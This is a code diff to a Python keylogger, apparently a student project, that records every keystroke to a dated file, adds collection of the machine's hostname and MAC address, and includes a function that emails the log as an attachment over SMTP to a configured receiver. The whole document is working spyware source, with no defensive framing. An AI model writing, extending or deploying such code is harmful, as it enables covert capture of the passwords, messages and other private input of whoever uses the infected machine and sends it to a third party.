@@ -7,6 +7,10 @@ import atexit
 import os
 from dotenv import load_dotenv
 
+import uuid
+import re
+import socket
+
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
@@ -15,7 +19,6 @@ import smtplib
 
 def cleanup_function():
     # Perform cleanup actions or trigger desired function
-
     search()
     # send_email()
 
@@ -39,6 +42,9 @@ def keyPressed(key):
     with open(f"{filename}.txt", 'a') as logKey:
         last = stamp(logKey, last, new, gap=60)
         new = False
+
+
+
         try:
             char = key.char
             if char in string.printable:
@@ -61,8 +67,6 @@ def keyPressed(key):
                 logKey.write("\n" + " "*29)
             elif str(key) == "Key.space":
                 logKey.write(" ")
-            # elif str(key) == "Key.print_screen":
-            #     logKey.write("")
             elif "Key.ctrl_" in str(key):
                  pass
             elif "Key.shift" in str(key):
@@ -70,14 +74,16 @@ def keyPressed(key):
             elif Key.esc:
                  pass
 
-            # elif str(key) == "Key.backspace":
-            #         if logKey.tell() > 0:
-            #             logKey.seek(logKey.tell() - 1)
-            #             logKey.truncate()
+            elif str(key) == "Key.backspace":
+            # elif Key.backspace:
+                if logKey.tell() > 0:
+                    logKey.seek(logKey.tell() - 1)
+                    logKey.truncate()
             else:
                  logKey.write(f"<{str(key)}>")
 
 def on_release(key):
+    # Stopping Listener
     if key == Key.esc:
         print("Escape key pressed. Stopping listener...")
         exit()
@@ -110,19 +116,19 @@ def send_email():
     # Define the file to attach
     file = f"{filename}.txt"
 
-    # Encode as base 64
-    with open(file, 'r') as f:
-        part = MIMEApplication(f.read(), Name=basename(file))
+    # Attachment file
+    with open(file, 'r') as logKey:
+        part = MIMEApplication(logKey.read(), Name=basename(file))
         part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(file))
     msg.attach(part)
 
-    # context = ssl.create_default_context()
-
+    # Sending Mail
     with smtplib.SMTP(smtp_server, port) as smtp:
         smtp.starttls()
         smtp.login(email_sender, email_password)
         smtp.send_message(msg, email_sender, email_receiver)
         print("mail sent")
+    logKey.close()
 def search():
     words = ['laptop', 'phone']
     with open(rf"C:\Users\USER\PycharmProjects\fyp\{filename}.txt", 'r') as logKey:
@@ -131,7 +137,19 @@ def search():
     for word in words:
         if word in content:
             print('string exist in a file')
+        logKey.close()
 
+def system_and_mac():
+    with open(f"{filename}.txt", 'a') as logKey:
+
+        system_name = socket.gethostname()
+        logKey.write("System Name : " + system_name)
+
+        # joins elements of getnode() after each 2 digits.
+        # using regex expression
+        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        logKey.write("\nMAC Address : " + mac + "\n")
+        logKey.close()
 
 
 
@@ -139,10 +157,16 @@ if __name__ == "__main__":
     dt = datetime.now()
     filename = dt.strftime("%Y-%m-%d")
 
+    with open(f"{filename}.txt", 'a') as logKey:
+        if os.stat(f"{filename}.txt").st_size == 0:
+            system_and_mac()
+        logKey.close()
+
     last = None
     new = True
     with keyboard.Listener(on_press=keyPressed, on_release=on_release) as l:
         l.join()
+
     atexit.register(cleanup_function)
 
     # clipboard_contents = get_clipboard_contents()
